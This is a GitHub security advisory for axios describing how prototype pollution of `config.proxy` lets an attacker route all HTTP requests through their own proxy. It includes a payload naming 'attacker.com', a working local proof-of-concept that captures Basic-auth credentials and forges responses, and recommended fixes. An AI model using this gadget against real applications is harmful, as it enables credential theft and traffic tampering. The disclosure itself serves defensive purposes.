# [H] axios Vulnerable to Full Man-in-the-Middle via Prototype Pollution Gadget in `config.proxy`

## Summary
Severity: High
Advisory: GHSA-35jp-ww65-95wh
CVE: CVE-2026-44494
CWE: CWE-1321, CWE-441
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-35jp-ww65-95wh
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.16.0

## Details
# Vulnerability Disclosure: Full Man-in-the-Middle via Prototype Pollution Gadget in `config.proxy`

## Summary

The Axios library is vulnerable to a Prototype Pollution "Gadget" attack that allows any `Object.prototype` pollution in the application's dependency tree to be escalated into a **full Man-in-the-Middle (MITM) attack** — intercepting, reading, and modifying all HTTP traffic including authentication credentials.

The HTTP adapter at `lib/adapters/http.js:670` reads `config.proxy` via standard property access, which traverses the prototype chain. Because `proxy` is **not present in Axios defaults**, the merged config object has no own `proxy` property, making it trivially injectable via prototype pollution. Once injected, `setProxy()` routes **all** HTTP requests through the attacker's proxy server.

Unlike the `transformResponse` gadget (which is constrained by `assertOptions` to return `true`), the proxy gadget has **zero constraints** — the attacker gets a full MITM position with the ability to read all credentials and tamper with all responses.

**Severity:** Critical (CVSS 9.4)
**Affected Versions:** All versions (v0.x - v1.x including v1.15.0)
**Vulnerable Component:** `lib/adapters/http.js` (config property access on merged object)

## CWE

- **CWE-1321:** Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')
- **CWE-441:** Unintended Proxy or Intermediary ('Confused Deputy')

## CVSS 3.1

**Score: 9.4 (Critical)**

Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L`

| Metric | Value | Justification |
|---|---|---|
| Attack Vector | Network | PP is triggered remotely via any vulnerable dependency |
| Attack Complexity | Low | Once PP exists, single property assignment: `Object.prototype.proxy = {host:'attacker', port:8080}`. Consistent with GHSA-fvcv-3m26-pcqx scoring methodology |
| Privileges Required | None | No authentication needed |
| User Interaction | None | No user interaction required |
| Scope | Unchanged | MITM within the application's network context |
| Confidentiality | **High** | Attacker sees ALL request data: Authorization headers, auth credentials, cookies, request bodies, full URLs (including internal hostnames) |
| Integrity | **High** | Attacker can modify ALL responses: inject malicious data, alter API results, redirect authentication flows. **No constraints** — unlike `transformResponse` which must return `true` |
| Availability | Low | Attacker could drop requests or return errors, but this is secondary to C/I impact |


### Why This Bypasses mergeConfig

The critical difference from `transformResponse`: the `proxy` property is **not in defaults** (`lib/defaults/index.js` does not set `proxy`). This means:

1. `mergeConfig` iterates `Object.keys({...defaults, ...userConfig})` — `proxy` is NOT in this set
2. `defaultToConfig2` for `proxy` is never called
3. The merged config has **no own `proxy` property**
4. When `http.js:670` reads `config.proxy`, JavaScript traverses the prototype chain
5. `Object.prototype.proxy` is found → used by `setProxy()`

This is a **more direct attack path** than `transformResponse` because it doesn't even go through `mergeConfig`'s merge logic — it completely bypasses it.

## Usage of "Helper" Vulnerabilities

This vulnerability requires **Zero Direct User Input**.

If an attacker can pollute `Object.prototype` via any other library in the stack (e.g., `qs`, `minimist`, `lodash`, `body-parser`), Axios will automatically use the polluted `proxy` value when making HTTP requests. The developer's code is completely safe — no configuration errors needed.

## Proof of Concept

### 1. The Setup (Simulated Pollution)

Imagine a scenario where a known prototype pollution vulnerability exists in a query parser. The attacker sends a payload that sets:

```javascript
Object.prototype.proxy = {
  host: 'attacker.com',
  port: 8080,
  protocol: 'http',
};
```

### 2. The Gadget Trigger (Safe Code)

The application makes a completely safe, hardcoded request:

```javascript
// This looks safe to the developer — no proxy configured
const response = await axios.get('https://api.internal.corp/secrets', {
  auth: { username: 'svc-account', password: 'prod-key-abc123!' }
});
```

### 3. The Execution

At `http.js:668-670`:
```javascript
setProxy(
  options,
  config.proxy,    // ← traverses prototype chain → finds polluted proxy
  protocol + '//' + parsed.hostname + (parsed.port ? ':' + parsed.port : '') + options.path
);
```

`setProxy()` at `http.js:191-239` then:
```javascript
function setProxy(options, configProxy, location) {
  let proxy = configProxy;    // = { host: 'attacker.com', port: 8080 }
  // ...
  if (proxy) {
    options.hostname = proxy.hostname || proxy.host;  // → 'attacker.com'
    options.port = proxy.port;                         // → 8080
    options.path = location;                           // → full URL as path
    // ...
  }
}
```

### 4. The Impact (Full MITM)

The attacker's proxy server receives:

```http
GET http://api.internal.corp/secrets HTTP/1.1
Host: api.internal.corp
Authorization: Basic c3ZjLWFjY291bnQ6cHJvZC1rZXktYWJjMTIzIQ==
User-Agent: axios/1.15.0
Accept: application/json, text/plain, */*
```

The `Authorization` header contains `svc-account:prod-key-abc123!` in Base64. The attacker:
- **Sees** every request URL, header, and body
- **Modifies** every response (inject malicious data, change auth results)
- **Logs** all API keys, session tokens, and passwords
- Operates as an **invisible** proxy — the developer has no indication

### 5. Verified PoC Code

```javascript
import http from 'http';
import axios from './index.js';

// Attacker's proxy server
const intercepted = [];
const proxyServer = http.createServer((req, res) => {
  intercepted.push({
    url: req.url,
    authorization: req.headers.authorization,
    headers: req.headers,
  });
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end('{"hijacked":true}');
});
await new Promise(r => proxyServer.listen(0, r));
const proxyPort = proxyServer.address().port;

// Real target server
const realServer = http.createServer((req, res) => {
  res.writeHead(200);
  res.end('{"data":"real"}');
});
await new Promise(r => realServer.listen(0, r));
const realPort = realServer.address().port;

// Prototype pollution
Object.prototype.proxy = { host: '127.0.0.1', port: proxyPort, protocol: 'http' };

// "Safe" request — goes through attacker's proxy
const resp = await axios.get(`http://127.0.0.1:${realPort}/api/secrets`, {
  auth: { username: 'admin', password: 'SuperSecret123!' }
});

console.log('Response from:', resp.data.hijacked ? 'ATTACKER PROXY' : 'real server');
console.log('Intercepted Authorization:', intercepted[0]?.authorization);
// Output: Basic YWRtaW46U3VwZXJTZWNyZXQxMjMh (= admin:SuperSecret123!)

delete Object.prototype.proxy;
realServer.close();
proxyServer.close();
```

## Verified PoC Output

```
[1] Normal request (before pollution):
    Response source: real server
    response.data: {"data":"from-real-server"}
    Proxy intercept count: 0

[2] Prototype Pollution: Object.prototype.proxy
    Set: Object.prototype.proxy = { host: "127.0.0.1", port: 50879 }

[3] Request after pollution (same code, same URL):
    Response source: ATTACKER PROXY!
    response.data: {"data":"from-attacker-proxy","hijacked":true}

[4] Data intercepted by attacker's proxy:
    Full URL: http://127.0.0.1:50878/api/secrets
    Host: 127.0.0.1:50878
    Authorization: Basic YWRtaW46U3VwZXJTZWNyZXQxMjMh
    All headers: {
      "accept": "application/json, text/plain, */*",
      "user-agent": "axios/1.15.0",
      "accept-encoding": "gzip, compress, deflate, br",
      "host": "127.0.0.1:50878",
      "authorization": "Basic YWRtaW46U3VwZXJTZWNyZXQxMjMh",
      "connection": "keep-alive"
    }

[5] Attacker capabilities demonstrated:
    ✓ Full URL visible (including internal hostnames)
    ✓ Authorization header visible (Base64-encoded credentials)
    ✓ Can modify/forge response data
    ✓ Affects ALL axios HTTP requests (not just a single instance)
    ✓ No assertOptions constraints (unlike transformResponse gadget)
```

## Impact Analysis

- **Full Credential Interception:** Every HTTP request's `Authorization` header, cookies, API keys, and request bodies are visible to the attacker's proxy in plaintext.
- **Arbitrary Response Tampering:** The attacker can return any response data — no constraints like `transformResponse`'s "must return true".
- **Internal Network Reconnaissance:** The proxy sees all request URLs, revealing internal hostnames, ports, and API paths.
- **Universal Scope:** Affects every axios HTTP request in the application, including all third-party libraries that use axios.
- **Invisible Attack:** The developer has no indication that a proxy has been injected — requests complete normally with attacker-controlled responses.
- **Bypass of 1.15.0 Fix:** The header sanitization patch in v1.15.0 (GHSA-fvcv-3m26-pcqx) does NOT address this vector.

### Why This Is More Severe Than transformResponse (axios_26)

| Dimension | transformResponse Gadget | **proxy Gadget** |
|---|---|---|
| Data access | `this.auth` + response data | **All headers, auth, body, URL, response** |
| Response control | Must return `true` | **Arbitrary responses** |
| Attack visibility | Response becomes `true` (suspicious) | **Normal-looking responses (invisible)** |
| mergeConfig involvement | Goes through defaultToConfig2 | **Bypasses mergeConfig entirely** |

## Recommended Fix

### Fix 1: Use `hasOwnProperty` when reading security-sensitive config properties

```javascript
// In lib/adapters/http.js
const proxy = Object.prototype.hasOwnProperty.call(config, 'proxy') ? config.proxy : undefined;
setProxy(options, proxy, location);
```

### Fix 2: Enumerate all properties not in defaults and apply `hasOwnProperty`

Properties not in defaults that are read by http.js and have security impact:
- `config.proxy` — MITM
- `config.socketPath` — Unix socket SSRF
- `config.transport` — request hijack
- `config.lookup` — DNS hijack
- `config.beforeRedirect` — redirect manipulation
- `config.httpAgent` / `config.httpsAgent` — agent injection

All should use `hasOwnProperty` checks.

### Fix 3: Use null-prototype object for merged config

```javascript
// In lib/core/mergeConfig.js
const config = Object.create(null);
```

## Resources

- [CWE-1321: Prototype Pollution](https://cwe.mitre.org/data/definitions/1321.html)
- [CWE-441: Unintended Proxy](https://cwe.mitre.org/data/definitions/441.html)
- [GHSA-fvcv-3m26-pcqx: Related PP Gadget in Axios (Fixed in 1.15.0)](https://github.com/advisories/GHSA-fvcv-3m26-pcqx)
- [Axios GitHub Repository](https://github.com/axios/axios)

## Timeline

| Date | Event |
|---|---|
| 2026-04-16 | Vulnerability discovered during source code audit |
| 2026-04-16 | PoC developed and verified — full MITM confirmed |
| TBD | Report submitted to vendor via GitHub Security Advisory |

## References
- https://github.com/axios/axios/security/advisories/GHSA-35jp-ww65-95wh
- https://nvd.nist.gov/vuln/detail/CVE-2026-44494
- https://github.com/advisories/GHSA-fvcv-3m26-pcqx
- https://github.com/axios/axios
